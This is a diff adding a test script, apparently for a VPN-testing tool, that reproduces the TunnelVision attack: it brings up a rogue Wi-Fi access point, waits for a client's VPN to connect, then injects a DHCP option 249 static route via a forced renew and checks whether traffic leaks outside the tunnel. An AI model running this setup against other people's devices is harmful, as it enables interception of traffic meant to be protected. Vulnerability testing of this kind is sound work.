@@ -1,0 +1,60 @@
+(*
+ * TunnelVision test using DHCP option 249 for classless static routes.
+ * Option 249 is the Microsoft variant of DHCP option 121.
+ *
+ * Variant: DHCP renew — the static route is only pushed after
+ * the VPN is active, via a forced DHCP renew.
+ *)
+
+state init begin:
+  miscnet = miscnet();
+  netmask = "255.255.255.0";
+  my_ip = "192.168.137.1";
+  target_ip = miscnet.lookup_ipv4("yourserver.com");
+  miscnet.log_file = "/tmp/dhcp_renew.log";
+  miscnet.masquerade("true");
+
+  ap = accesspoint();
+  ap.wifi_interface = "wlan0";
+  ap.ipv4_addr = my_ip;
+  ap.ipv4_netmask = netmask;
+  ap.wifi_ssid = "249";
+  ap.dhcp4_enable = "true";
+  ap.dhcp4_dns = my_ip;
+  ap.dhcp4_router = my_ip;
+  ap.dhcp4_leasetime = "15";
+  ap.route_to_default = "true";
+  ap.dns_enable = "true";
+  ap.bring_up(ap_up, ap_err);
+
+state ap_err:
+  exit("failed to bring up access point: ", errstr);
+
+state ap_up:
+  mon = trafficmonitor();
+  mon.interface = ap.ap_interface;
+  endpoints = "tcp://ams.nl.eduvpn.org:443;udp://ams.nl.eduvpn.org:443";
+  endpoints = concat(endpoints, ";tcp://145.100.179.3:443");
+  mon.vpn_endpoints = endpoints;
+  mon.detect_vpn(vpn_detected, mon_err, "5000");
+  print("[i] Zet de VPN aan op het clientapparaat...");
+
+state mon_err:
+  exit("Error occurred: ", errstr);
+
+state vpn_detected:
+  ap.dhcp4_static_route_option = "249";
+  ap.dhcp4_static_route(target_ip, "255.255.255.0", my_ip);
+  ap.dhcp4_reload();
+  ap.dhcp4_renew(dhcp_renewed);
+  print("[i] VPN gedetecteerd. Wachten op DHCP renew...");
+
+state dhcp_renewed:
+  mon.validation_server = "https://yourserver.com/";
+  mon.detect_attack(vpn_safe, vpn_vuln, mon_err);
+
+state vpn_safe:
+  exit("Your vpn appears to be safe.");
+
+state vpn_vuln:
+  exit("Your vpn appears to be vulnerable to DHCP option 249 routes.");
